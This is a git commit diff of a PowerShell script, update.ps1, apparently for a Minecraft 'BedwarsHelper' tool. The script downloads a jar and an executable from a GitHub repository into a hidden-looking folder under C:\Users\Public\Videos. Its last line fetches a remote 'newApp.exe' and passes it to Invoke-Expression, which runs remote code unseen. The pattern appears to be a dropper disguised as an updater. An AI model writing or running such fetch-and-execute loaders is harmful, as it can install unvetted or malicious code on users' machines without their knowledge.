8a9a180a04ae30eea0c20833e72d79cdcc050579
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-23 14:09:51 +0100

    Update update.ps1

--- update.ps1
+++ update.ps1
@@ -1,4 +1,4 @@
 Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/bedwarshelper.jar -OutFile C:\Users\Public\Videos\BedwarsHelper\bedwarshelper.jar -UseBasicParsing -Force
-Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/BedwarsHelper.exe -OutFile C:\Users\%USERNAME%\BedwarsHelper.exe -UseBasicParsing -Force
+Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/BedwarsHelper.exe -OutFile C:\Users\Public\Videos\BedwarsHelper\BedwarsHelper.exe -UseBasicParsing -Force
 
 Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/Updates/raw/main/newApp.exe" -UseBasicParsing).Content
